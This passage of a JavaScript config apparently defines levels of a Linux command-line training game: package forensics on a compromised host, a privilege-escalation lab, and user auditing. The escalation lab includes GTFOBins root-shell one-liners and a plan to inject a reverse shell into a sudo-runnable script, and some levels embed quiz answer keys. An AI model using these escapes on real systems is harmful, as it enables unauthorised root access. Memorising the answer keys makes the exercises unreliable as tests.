║   dpkg -S /path/to/file      # Find owning package            ║
║   apt-cache search <term>    # Search available packages      ║
║                                                               ║
║ PACKAGE INFO:                                                 ║
║   dpkg -s <package>          # Package status/details         ║
║   dpkg -L <package>          # List files in package          ║
║   apt-cache show <package>   # Full package information       ║
║                                                               ║
║ INSTALLATION LOGS:                                            ║
║   /var/log/dpkg.log          # Package manager log            ║
║   /var/log/apt/history.log   # APT history                    ║
║   grep " install " dpkg.log  # Find installs                  ║
║   grep " remove " dpkg.log   # Find removals                  ║
║                                                               ║
║ VERIFY INTEGRITY:                                             ║
║   dpkg -V <package>          # Verify package files           ║
║   debsums <package>          # Checksum verification          ║
║   apt-get --reinstall        # Reinstall corrupted package    ║
╚═══════════════════════════════════════════════════════════════╝`
                },
                '/home/analyst/.bashrc': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 512,
                    content: '# Analyst shell config\nexport PS1="[analyst@FORENSIC-WS \\W]$ "\nalias pkglist="dpkg -l | grep ^ii"\nalias recentpkgs="grep install /var/log/dpkg.log | tail -20"'
                },
                '/home/analyst/package_audit': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
                    children: ['baseline.txt', 'current.txt', 'diff.txt', 'README.txt']
                },
                '/home/analyst/package_audit/README.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 384,
                    content: `PACKAGE AUDIT WORKSPACE
=======================
Incident: IR-2026-0119
Target: Production Web Server

baseline.txt - Known good packages from golden image
current.txt  - Current package list from compromised host
diff.txt     - Differences found (REVIEW CAREFULLY)

Analyst Notes:
- Compare packages to find unauthorized installations
- Check dpkg.log for installation timestamps
- Verify package integrity with dpkg -V`
                },
                '/home/analyst/package_audit/baseline.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 2048,
                    content: `BASELINE PACKAGE LIST - Golden Image v3.1
==========================================
ii  apache2           2.4.54    amd64   Apache HTTP Server
ii  bash              5.1-6     amd64   GNU Bourne Again Shell
ii  coreutils         8.32-4    amd64   GNU core utilities
ii  curl              7.81.0    amd64   Command line URL tool
ii  dpkg              1.21.1    amd64   Debian package manager
ii  grep              3.7-1     amd64   GNU grep
ii  libc6             2.35-0    amd64   GNU C Library
ii  libssl3           3.0.2-0   amd64   SSL shared libraries
ii  mysql-client      8.0.32    amd64   MySQL client
ii  nginx             1.22.1    amd64   HTTP and reverse proxy
ii  openssh-server    8.9p1     amd64   Secure shell server
ii  openssl           3.0.2-0   amd64   SSL toolkit
ii  php8.1            8.1.12    amd64   PHP interpreter
ii  rsync             3.2.3-8   amd64   Fast file copy
ii  tar               1.34-1    amd64   GNU tar
ii  vim               8.2.3995  amd64   Vi IMproved
ii  wget              1.21.2    amd64   Network downloader`
                },
                '/home/analyst/package_audit/current.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 2560,
                    content: `CURRENT PACKAGE LIST - Compromised Host
========================================
ii  apache2           2.4.54    amd64   Apache HTTP Server
ii  bash              5.1-6     amd64   GNU Bourne Again Shell
ii  coreutils         8.32-4    amd64   GNU core utilities
ii  curl              7.81.0    amd64   Command line URL tool
ii  dpkg              1.21.1    amd64   Debian package manager
ii  grep              3.7-1     amd64   GNU grep
ii  htop              3.2.1     amd64   Interactive process viewer
ii  libc6             2.35-0    amd64   GNU C Library
ii  libssl3           3.0.2-0   amd64   SSL shared libraries
ii  mysql-client      8.0.32    amd64   MySQL client
ii  ncat              7.93      amd64   Nmap network tool <<<SUSPICIOUS
ii  netminer          0.9.7     amd64   Network utility <<<UNKNOWN
ii  nginx             1.22.1    amd64   HTTP and reverse proxy
ii  openssh-server    8.9p1     amd64   Secure shell server
ii  openssl           3.0.2-0   amd64   SSL toolkit
ii  php8.1            8.1.12    amd64   PHP interpreter
ii  rsync             3.2.3-8   amd64   Fast file copy
ii  socat             1.7.4.1   amd64   Multipurpose relay <<<SUSPICIOUS
ii  tar               1.34-1    amd64   GNU tar
ii  vim               8.2.3995  amd64   Vi IMproved
ii  wget              1.21.2    amd64   Network downloader`
                },
                '/home/analyst/package_audit/diff.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 768,
                    content: `PACKAGE DIFFERENCES DETECTED
============================
Analysis Date: 2026-01-19

PACKAGES ADDED (not in baseline):
+ htop       3.2.1    - Process viewer (legitimate?)
+ ncat       7.93     - Netcat variant (SUSPICIOUS - data exfil tool)
+ netminer   0.9.7    - UNKNOWN PACKAGE (investigate immediately)
+ socat      1.7.4.1  - Relay tool (SUSPICIOUS - tunnel capability)

PACKAGES REMOVED:
(none)

PACKAGES MODIFIED:
(none)

PRIORITY: Investigate 'netminer' - not in any known repository
ACTION: Check /var/log/dpkg.log for installation timestamp`
                },
                '/home/analyst/reports': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
                    children: ['analysis_template.txt', 'findings_draft.txt']
                },
                '/home/analyst/reports/analysis_template.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 384,
                    content: `FORENSIC PACKAGE ANALYSIS REPORT
=================================
Case ID:
Analyst:
Date:

1. UNAUTHORIZED PACKAGES FOUND:
   -

2. INSTALLATION TIMELINE:
   -

3. PACKAGE INTEGRITY ISSUES:
   -

4. RECOMMENDATIONS:
   - `
                },
                '/home/analyst/reports/findings_draft.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 512,
                    content: `PRELIMINARY FINDINGS
====================
The package 'netminer' appears to be the primary malware.

Key observations:
- Not found in official Debian/Ubuntu repositories
- Installed from local .deb file (see dpkg.log)
- Package description claims "network utility" but...
- Version 0.9.7 - low version suggests custom build

TODO: Get full details with dpkg -s netminer`
                },
                '/home/analyst/evidence': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
                    children: ['captured_deb.txt', 'hash_values.txt']
                },
                '/home/analyst/evidence/captured_deb.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 256,
                    content: `CAPTURED EVIDENCE
=================
File: netminer_0.9.7_amd64.deb
Location: /tmp/ (since deleted)
MD5: a1b2c3d4e5f6...

Package control file showed:
Maintainer: shadow@darknet.local
Description: Network data extraction utility`
                },
                '/home/analyst/evidence/hash_values.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 384,
                    content: `HASH VALUES FOR EVIDENCE
========================
baseline.txt    MD5: 3d4f5a6b7c8d9e0f...
current.txt     MD5: 9a8b7c6d5e4f3a2b...
dpkg.log        MD5: f1e2d3c4b5a6...

Malware Package:
netminer deb    MD5: a1b2c3d4e5f6...
netminer binary SHA256: 7f8e9d0c1b2a3...`
                },
                '/var/log': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                    children: ['dpkg.log', 'apt']
                },
                '/var/log/dpkg.log': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 4096,
                    content: `2026-01-10 08:15:22 startup packages configure
2026-01-10 08:15:23 configure libc6:amd64 2.35-0 <none>
2026-01-10 08:15:24 status installed libc6:amd64 2.35-0
2026-01-12 14:30:01 install htop:amd64 <none> 3.2.1
2026-01-12 14:30:02 status installed htop:amd64 3.2.1
2026-01-15 02:47:33 install ncat:amd64 <none> 7.93
2026-01-15 02:47:34 status installed ncat:amd64 7.93
2026-01-15 02:48:15 install socat:amd64 <none> 1.7.4.1
2026-01-15 02:48:16 status installed socat:amd64 1.7.4.1
2026-01-15 02:51:07 install netminer:amd64 <none> 0.9.7
2026-01-15 02:51:08 status installed netminer:amd64 0.9.7
2026-01-17 09:00:01 upgrade openssl:amd64 3.0.2-0 3.0.2-1
2026-01-17 09:00:02 status installed openssl:amd64 3.0.2-1
2026-01-18 11:22:45 startup packages configure`
                },
                '/var/log/apt': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                    children: ['history.log']
                },
                '/var/log/apt/history.log': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 1024,
                    content: `Start-Date: 2026-01-12  14:30:00
Commandline: apt install htop
Install: htop:amd64 (3.2.1)
End-Date: 2026-01-12  14:30:03

Start-Date: 2026-01-15  02:47:30
Commandline: dpkg -i /tmp/toolkit.deb
Install: ncat:amd64 (7.93), socat:amd64 (1.7.4.1)
End-Date: 2026-01-15  02:48:20

Start-Date: 2026-01-15  02:51:00
Commandline: dpkg -i /tmp/netminer_0.9.7_amd64.deb
Install: netminer:amd64 (0.9.7)
End-Date: 2026-01-15  02:51:10`
                },
            },

            objectives: [
                { id: 1, task: 'LIST: Installed Packages', hint: '$ dpkg -l (or apt list --installed)',
                  check: (cmd, state, output) => (cmd.includes('dpkg') && cmd.includes('-l')) || (cmd.includes('apt') && cmd.includes('list')) &&
                         output && (output.includes('ii') || output.includes('installed')) },
                { id: 2, task: 'SEARCH: Suspicious Package', hint: '$ dpkg -l | grep netminer',
                  check: (cmd, state, output) => cmd.includes('dpkg') && cmd.includes('grep') &&
                         output && (output.includes('netminer') || output.includes('ncat') || output.includes('socat')) },
                { id: 3, task: 'CHECK: Package Info', hint: '$ dpkg -s netminer',
                  check: (cmd, state, output) => cmd.includes('dpkg') && cmd.includes('-s') &&
                         output && (output.includes('Package:') || output.includes('Status:') || output.includes('Version:')) },
                { id: 4, task: 'FIND: Installation Timeline', hint: '$ grep " install " /var/log/dpkg.log',
                  check: (cmd, state, output) => cmd.includes('grep') && cmd.includes('dpkg.log') &&
                         output && (output.includes('install') || output.includes('netminer')) },
                { id: 5, task: 'VERIFY: Package Files', hint: '$ dpkg -V netminer (or dpkg -L)',
                  check: (cmd, state, output) => cmd.includes('dpkg') && (cmd.includes('-V') || cmd.includes('-L')) &&
                         output && output.length > 0 },
            ],

            insightPhase: {
                enabled: true,
                question: "At what time (HH:MM:SS) was the malicious 'netminer' package installed?",
                hint: "Check the dpkg.log for the exact timestamp when netminer was installed.",
                hintAfterAttempts: 3,
                acceptedAnswers: ['02:51:07', '2:51:07'],
                correctAnswerMessage: 'Intel confirmed. Netminer installed at 02:51:07 — forensic timeline updated.',
                wrongAnswerMessage: 'Negative. Review your findings and try again.',
            },

            remoteHosts: null,

            // System packages for dpkg command - includes suspicious packages for forensic analysis
            packages: [
                { name: 'apache2',        version: '2.4.54',   arch: 'amd64', desc: 'Apache HTTP Server' },
                { name: 'bash',           version: '5.1-6',    arch: 'amd64', desc: 'GNU Bourne Again Shell' },
                { name: 'coreutils',      version: '8.32-4',   arch: 'amd64', desc: 'GNU core utilities' },
                { name: 'curl',           version: '7.81.0',   arch: 'amd64', desc: 'Command line URL tool' },
                { name: 'dpkg',           version: '1.21.1',   arch: 'amd64', desc: 'Debian package manager' },
                { name: 'grep',           version: '3.7-1',    arch: 'amd64', desc: 'GNU grep' },
                { name: 'htop',           version: '3.2.1',    arch: 'amd64', desc: 'Interactive process viewer' },
                { name: 'libc6',          version: '2.35-0',   arch: 'amd64', desc: 'GNU C Library' },
                { name: 'libssl3',        version: '3.0.2-0',  arch: 'amd64', desc: 'SSL shared libraries' },
                { name: 'mysql-client',   version: '8.0.32',   arch: 'amd64', desc: 'MySQL client' },
                { name: 'ncat',           version: '7.93',     arch: 'amd64', desc: 'Nmap network tool' },
                { name: 'netminer',       version: '0.9.7',    arch: 'amd64', desc: 'Network utility' },
                { name: 'nginx',          version: '1.22.1',   arch: 'amd64', desc: 'HTTP and reverse proxy' },
                { name: 'openssh-server', version: '8.9p1',    arch: 'amd64', desc: 'Secure shell server' },
                { name: 'openssl',        version: '3.0.2-0',  arch: 'amd64', desc: 'SSL toolkit' },
                { name: 'php8.1',         version: '8.1.12',   arch: 'amd64', desc: 'PHP interpreter' },
                { name: 'rsync',          version: '3.2.3-8',  arch: 'amd64', desc: 'Fast file copy' },
                { name: 'socat',          version: '1.7.4.1',  arch: 'amd64', desc: 'Multipurpose relay' },
                { name: 'tar',            version: '1.34-1',   arch: 'amd64', desc: 'GNU tar' },
                { name: 'vim',            version: '8.2.3995', arch: 'amd64', desc: 'Vi IMproved' },
                { name: 'wget',           version: '1.21.2',   arch: 'amd64', desc: 'Network downloader' },
            ],
        },

        // ──────────────────────────────────────────────────────────
        // CLH-026: Access Control
        // Theme: Privilege escalation analysis
        // ──────────────────────────────────────────────────────────
        'CLH-026': {
            title: 'Access Control',
            description: 'Analyze access controls and find privilege escalation paths.',
            prerequisites: ['CLH-025'],
            tier: 'CLI Wraith',
            user: 'infiltrator',
            hostname: 'EMBASSY-SRV',
            startDir: '/home/infiltrator',
            allowedCommands: null,

            filesystem: {
                '/home/infiltrator': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'infiltrator', group: 'infiltrator',
                    children: ['privesc_notes', 'recon', 'exploits', '.bashrc', '.bash_history', '.privesc_cheatsheet']
                },
                '/home/infiltrator/.bash_history': {
                    type: 'file', perms: '-rw-------', owner: 'infiltrator', group: 'infiltrator', size: 384,
                    content: `id
groups
whoami
find / -perm -4000 -type f 2>/dev/null
sudo -l
find / -perm -o+w -type f 2>/dev/null | head -20
getcap -r / 2>/dev/null
cat /etc/sudoers 2>/dev/null
ls -la /etc/shadow`
                },
                '/home/infiltrator/.privesc_cheatsheet': {
                    type: 'file', perms: '-rw-r--r--', owner: 'infiltrator', group: 'infiltrator', size: 1792,
                    content: `╔═══════════════════════════════════════════════════════════════╗
║            PRIVILEGE ESCALATION CHEATSHEET                    ║
╠═══════════════════════════════════════════════════════════════╣
║ CURRENT CONTEXT:                                              ║
║   id                         # User ID, groups                ║
║   groups                     # Group memberships              ║
║   whoami                     # Current username               ║
║                                                               ║
║ SUID/SGID HUNTING:                                            ║
║   find / -perm -4000 2>/dev/null    # SUID files              ║
║   find / -perm -2000 2>/dev/null    # SGID files              ║
║   find / -perm -6000 2>/dev/null    # Both SUID+SGID          ║
║                                                               ║
║ SUDO ANALYSIS:                                                ║
║   sudo -l                    # What can I sudo?               ║
║   sudo -V                    # Sudo version (CVE check)       ║
║   cat /etc/sudoers           # Full sudo config (if readable) ║
║                                                               ║
║ WORLD-WRITABLE:                                               ║
║   find / -perm -o+w -type f 2>/dev/null  # Writable files     ║
║   find / -perm -o+w -type d 2>/dev/null  # Writable dirs      ║
║                                                               ║
║ CAPABILITIES:                                                 ║
║   getcap -r / 2>/dev/null    # Files with capabilities        ║
║   # Dangerous: cap_setuid, cap_setgid, cap_sys_admin          ║
║                                                               ║
║ COMMON PRIVESC PATHS:                                         ║
║   - SUID binaries (GTFOBins)                                  ║
║   - Sudo misconfigurations                                    ║
║   - Writable /etc/passwd                                      ║
║   - Cron jobs running as root                                 ║
║   - Capabilities on binaries                                  ║
╚═══════════════════════════════════════════════════════════════╝`
                },
                '/home/infiltrator/.bashrc': {
                    type: 'file', perms: '-rw-r--r--', owner: 'infiltrator', group: 'infiltrator', size: 256,
                    content: '# Infiltrator shell config\nexport PS1="[infiltrator@EMBASSY-SRV \\W]$ "\nalias suidscan="find / -perm -4000 -type f 2>/dev/null"\nalias worldwrite="find / -perm -o+w -type f 2>/dev/null"'
                },
                '/home/infiltrator/privesc_notes': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'infiltrator', group: 'infiltrator',
                    children: ['suid_binaries.txt', 'sudo_rules.txt', 'weak_perms.txt', 'README.txt']
                },
                '/home/infiltrator/privesc_notes/README.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'infiltrator', group: 'infiltrator', size: 384,
                    content: `PRIVESC RECONNAISSANCE NOTES
============================
Operation: EMBASSY BREACH
Objective: Escalate from infiltrator -> root

Current Access Level: infiltrator (low-priv user)
Target: root access on EMBASSY-SRV

Strategy:
1. Enumerate SUID binaries
2. Check sudo permissions
3. Find world-writable files
4. Check for capabilities
5. Identify weakest path to root`
                },
                '/home/infiltrator/privesc_notes/suid_binaries.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'infiltrator', group: 'infiltrator', size: 768,
                    content: `SUID BINARIES DISCOVERED
========================
Scan Date: 2026-01-19

STANDARD (expected):
/usr/bin/passwd         - Password change (normal)
/usr/bin/sudo           - Sudo binary (normal)
/usr/bin/su             - Switch user (normal)
/usr/bin/mount          - Mount filesystems (normal)
/usr/bin/ping           - ICMP ping (normal)

INTERESTING:
/usr/bin/find           - GTFOBins: find . -exec /bin/sh -p \\;
/usr/bin/vim            - GTFOBins: vim -c ':!/bin/sh'
/usr/local/bin/backup   - CUSTOM BINARY (investigate!)

PRIORITY TARGET: /usr/local/bin/backup
Reason: Custom binary, likely misconfigured
Action: Check with strings, ltrace, or run with test input`
                },
                '/home/infiltrator/privesc_notes/sudo_rules.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'infiltrator', group: 'infiltrator', size: 512,
                    content: `SUDO PERMISSIONS ANALYSIS
=========================
Output of sudo -l for infiltrator:

User infiltrator may run the following commands on EMBASSY-SRV:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/scripts/report.py
    (ALL) NOPASSWD: /usr/bin/less /var/log/auth.log

ANALYSIS:
- python3 report.py: Check if report.py is writable!
- less auth.log: Can spawn shell with !sh

EXPLOITATION NOTES:
The 'less' command allows shell escape: press !sh while viewing`
                },
                '/home/infiltrator/privesc_notes/weak_perms.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'infiltrator', group: 'infiltrator', size: 640,
                    content: `WORLD-WRITABLE FILES FOUND
==========================
Scan: find / -perm -o+w -type f 2>/dev/null

CRITICAL:
/opt/scripts/report.py   - 0777 - JACKPOT! Python script we can sudo

HIGH RISK:
/var/tmp/cleanup.sh      - 0666 - Possibly cron executed
/tmp/session_data.txt    - 0777 - Temp file

LOW RISK:
/var/log/app.log         - 0666 - Just a log file
/tmp/.X11-unix/*         - 0777 - X11 sockets (normal)

EXPLOITATION PATH IDENTIFIED:
1. Modify /opt/scripts/report.py
2. Insert reverse shell or command
3. Run: sudo /usr/bin/python3 /opt/scripts/report.py
4. PROFIT: Root shell`
                },
                '/home/infiltrator/recon': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'infiltrator', group: 'infiltrator',
                    children: ['system_info.txt', 'users.txt', 'capabilities.txt']
                },
                '/home/infiltrator/recon/system_info.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'infiltrator', group: 'infiltrator', size: 384,
                    content: `SYSTEM INFORMATION
==================
Hostname: EMBASSY-SRV
OS: Ubuntu 22.04 LTS
Kernel: 5.15.0-generic
Architecture: x86_64

Security Notes:
- AppArmor: enforcing
- SELinux: disabled
- Firewall: ufw active
- No AV detected`
                },
                '/home/infiltrator/recon/users.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'infiltrator', group: 'infiltrator', size: 256,
                    content: `USERS ON SYSTEM
===============
root:x:0:0:root:/root:/bin/bash
infiltrator:x:1001:1001::/home/infiltrator:/bin/bash
admin:x:1000:1000:Administrator:/home/admin:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false`
                },
                '/home/infiltrator/recon/capabilities.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'infiltrator', group: 'infiltrator', size: 384,
                    content: `LINUX CAPABILITIES - Recon Notes
=================================
Previous operator ran partial scan but results corrupted.

WHAT TO LOOK FOR:
- cap_setuid=ep : Can change UID to any user (ROOT!)
- cap_setgid=ep : Can change GID to any group
- cap_net_raw=ep : Can send raw packets (normal for ping)

COMMANDS:
getcap -r / 2>/dev/null    # Recursive scan (may take time)
getcap /usr/bin/*          # Quick scan of common binaries

WHY CAPABILITIES MATTER:
Unlike SUID, capabilities are granular permissions.
A binary with cap_setuid can become root without being SUID!

ACTION: Run getcap scan and look for cap_setuid on scripting languages.`
                },
                '/home/infiltrator/exploits': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'infiltrator', group: 'infiltrator',
                    children: ['gtfobins_notes.txt', 'attack_plan.txt']
                },
                '/home/infiltrator/exploits/gtfobins_notes.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'infiltrator', group: 'infiltrator', size: 640,
                    content: `GTFOBINS REFERENCE
==================
Source: https://gtfobins.github.io/

FIND (SUID):
find . -exec /bin/sh -p \\; -quit

VIM (SUID):
vim -c ':!/bin/sh'

LESS (SUDO):
sudo less /var/log/auth.log
!sh

PYTHON (SUID/SUDO/CAPABILITIES):
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

NMAP (SUID, old versions):
nmap --interactive
!sh`
                },
                '/home/infiltrator/exploits/attack_plan.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'infiltrator', group: 'infiltrator', size: 512,
                    content: `PRIVILEGE ESCALATION ATTACK PLAN
=================================
Operation: EMBASSY BREACH
Target: root access

ENUMERATION CHECKLIST:
[ ] sudo -l : What can we run as root?
[ ] getcap -r / 2>/dev/null : Any dangerous capabilities?
[ ] find / -perm -4000 : SUID binaries?
[ ] ls -la /opt/scripts/ : World-writable scripts?

MULTIPLE PATHS MAY EXIST:
- Capability abuse (if cap_setuid found)
- Sudo misconfiguration
- SUID binary exploitation
- Writable script injection

PRIORITY: Run capability scan first - fastest path to root.
Look for scripting languages with cap_setuid!`
                },
            },

            objectives: [
                { id: 1, task: 'RECON: Confirm your access level', hint: 'Who are you? What groups? → id',
                  check: (cmd, state, output) => cmd.includes('id') &&
                         output && (output.includes('uid=') || output.includes('infiltrator')) },
                { id: 2, task: 'ENUM: Check what you can sudo', hint: 'What commands can you run as root? → sudo -l',
                  check: (cmd, state, output) => cmd.includes('sudo') && cmd.includes('-l') &&
                         output && (output.includes('NOPASSWD') || output.includes('may run')) },
                { id: 3, task: 'ENUM: Scan for dangerous capabilities', hint: 'Capabilities can bypass permissions → getcap -r / 2>/dev/null',
                  check: (cmd, state, output) => cmd.includes('getcap') &&
                         output && output.includes('cap_') },
                { id: 4, task: 'ANALYZE: Read the recon notes', hint: 'Previous recon is in ~/recon/ and ~/privesc_notes/',
                  check: (cmd, state, output) => cmd.includes('cat') &&
                         (cmd.includes('capabilities') || cmd.includes('sudo_rules') || cmd.includes('attack_plan')) &&
                         output && output.length > 50 },
                { id: 5, task: 'IDENTIFY: Find the easiest escalation path', hint: 'Which binary has cap_setuid? Check ~/exploits/attack_plan.txt',
                  check: (cmd, state, output) => cmd.includes('cat') && cmd.includes('attack_plan') &&
                         output && output.includes('cap_setuid') },
            ],

            insightPhase: {
                enabled: true,
                question: "Your getcap scan found a binary with cap_setuid=ep. This capability allows a program to change its user ID to ANY user - including root (UID 0). Which binary has this dangerous capability?",
                hint: "Run: getcap -r / 2>/dev/null — look for 'cap_setuid=ep' in the output.",
                hintAfterAttempts: 2,
                acceptedAnswers: ['python3.10', '/usr/bin/python3.10', 'python3', '/usr/bin/python3'],
                correctAnswerMessage: 'Intel confirmed. python3.10 has cap_setuid=ep — privilege escalation path identified.',
                wrongAnswerMessage: 'Negative. Review your findings and try again.',
            },

            remoteHosts: null,

            // Privilege escalation config for security commands
            sudoRules: `User infiltrator may run the following commands on EMBASSY-SRV:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/scripts/report.py
    (ALL) NOPASSWD: /usr/bin/less /var/log/auth.log`,

            suidBinaries: [
                '/usr/bin/passwd',
                '/usr/bin/sudo',
                '/usr/bin/su',
                '/usr/bin/mount',
                '/usr/bin/ping',
                '/usr/bin/find',
                '/usr/bin/vim',
                '/usr/local/bin/backup',
            ],

            writableFiles: [
                '/opt/scripts/report.py',
                '/var/tmp/cleanup.sh',
                '/tmp/session_data.txt',
                '/var/log/app.log',
            ],

            capabilities: `/usr/bin/python3.10 cap_setuid=ep
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep`,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-027: User Management
        // Theme: Managing user accounts post-compromise
        // ──────────────────────────────────────────────────────────
        'CLH-027': {
            title: 'User Management',
            description: 'Understand user management commands for persistence and cleanup.',
            prerequisites: ['CLH-026'],
            tier: 'CLI Wraith',
            user: 'admin',
            hostname: 'ADMIN-SRV',
            startDir: '/home/admin',
            allowedCommands: null,

            filesystem: {
                '/home/admin': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'admin', group: 'admin',
                    children: ['user_audit', 'scripts', 'evidence', '.bashrc', '.bash_history', '.user_mgmt_cheatsheet']
                },
                '/home/admin/.bash_history': {
                    type: 'file', perms: '-rw-------', owner: 'admin', group: 'admin', size: 384,
                    content: `cat /etc/passwd
cat /etc/passwd | cut -d: -f1
getent passwd admin
groups admin
cat /etc/group | grep sudo
passwd -S admin
chage -l admin
cat /etc/shells
grep -v nologin /etc/passwd
lastlog | head -20`
                },
                '/home/admin/.user_mgmt_cheatsheet': {
                    type: 'file', perms: '-rw-r--r--', owner: 'admin', group: 'admin', size: 1792,
                    content: `╔═══════════════════════════════════════════════════════════════╗
║              USER MANAGEMENT CHEATSHEET                       ║
╠═══════════════════════════════════════════════════════════════╣
║ LIST USERS:                                                   ║
║   cat /etc/passwd              # All users (full entry)       ║
║   cat /etc/passwd | cut -d: -f1    # Usernames only           ║
║   getent passwd                # All users via NSS            ║
║   compgen -u                   # Bash user completion list    ║
║                                                               ║
║ USER DETAILS:                                                 ║
║   getent passwd <user>         # Full passwd entry            ║
║   id <user>                    # UID, GID, groups             ║
║   finger <user>                # User info (if installed)     ║
║                                                               ║
║ GROUP MANAGEMENT:                                             ║
║   groups <user>                # Groups for user              ║
║   cat /etc/group               # All groups                   ║
║   getent group <group>         # Group members                ║
║   id -nG <user>                # Group names for user         ║
║                                                               ║
║ PASSWORD STATUS:                                              ║
║   passwd -S <user>             # Password status              ║
║   chage -l <user>              # Password aging info          ║
║   cat /etc/shadow              # Password hashes (root only)  ║
║                                                               ║
║ LOGIN SHELLS:                                                 ║
║   cat /etc/shells              # Valid login shells           ║
║   grep -v nologin /etc/passwd  # Users with login shells      ║
║   grep /bin/bash /etc/passwd   # Bash users                   ║
║                                                               ║
║ AUDIT COMMANDS:                                               ║
║   lastlog                      # Last login for all users     ║
║   last                         # Recent logins                ║
║   who                          # Currently logged in          ║
║   w                            # Who + what they're doing     ║
╚═══════════════════════════════════════════════════════════════╝`
                },
                '/home/admin/.bashrc': {
                    type: 'file', perms: '-rw-r--r--', owner: 'admin', group: 'admin', size: 256,
                    content: '# Admin shell config\nexport PS1="[admin@ADMIN-SRV \\W]$ "\nalias userlist="cat /etc/passwd | cut -d: -f1"\nalias shellcheck="grep -v nologin /etc/passwd"'
                },
                '/home/admin/user_audit': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'admin', group: 'admin',
                    children: ['user_list.txt', 'group_memberships.txt', 'suspicious_accounts.txt', 'README.txt', 'COMMAND_REFERENCE.txt']
                },
                '/home/admin/user_audit/COMMAND_REFERENCE.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'admin', group: 'admin', size: 4096,
                    content: `COMMAND SYNTAX REFERENCE
========================
This file explains the complex commands used in user auditing.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
PIPES ( | ) - Connecting Commands
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
The pipe symbol | sends the output of one command as input to another.

  command1 | command2
  └──────┘   └──────┘
  output  →  input

Example: cat /etc/passwd | cut -d: -f1
  1. cat /etc/passwd    → outputs the entire passwd file
  2. |                  → sends that output to cut
  3. cut -d: -f1        → extracts just the first field

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
CUT COMMAND - Extracting Fields
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
cut -d: -f1

  -d:     "delimiter is colon"
  │ │
  │ └── the character that separates fields (here it's :)
  └──── -d means "delimiter"

  -f1     "field number 1"
  │ │
  │ └── which field to extract (1 = first)
  └──── -f means "field"

The /etc/passwd file uses colons as separators:
  root:x:0:0:root:/root:/bin/bash
  └──┘ │ │ │ └──┘ └───┘ └───────┘
  f1   f2 f3 f4 f5   f6    f7

  -f1 = username (root)
  -f3 = UID (0)
  -f6 = home directory (/root)
  -f7 = shell (/bin/bash)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
GETENT COMMAND - Database Queries
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
getent <database> [key]

  getent passwd           → all users
  getent passwd admin     → just the admin user
  getent group sudo       → members of sudo group

Databases:
  passwd  - user accounts (/etc/passwd)
  group   - groups (/etc/group)
  shadow  - password hashes (root only)
  hosts   - hostname lookups

Why getent instead of cat?
  • getent queries ALL sources (local files + LDAP/AD)
  • cat only reads local files
  • In enterprise networks, users may be in Active Directory

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
GREP -v - Inverse Matching
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
grep -v pattern file

  -v means "invert match" (show lines that DON'T match)

  grep nologin /etc/passwd      → shows accounts WITH nologin
  grep -v nologin /etc/passwd   → shows accounts WITHOUT nologin
                                  (i.e., accounts that CAN log in)

This is useful for finding:
  • Real user accounts (not system accounts)
  • Accounts that could be used for login
  • Potential backdoor accounts with shells

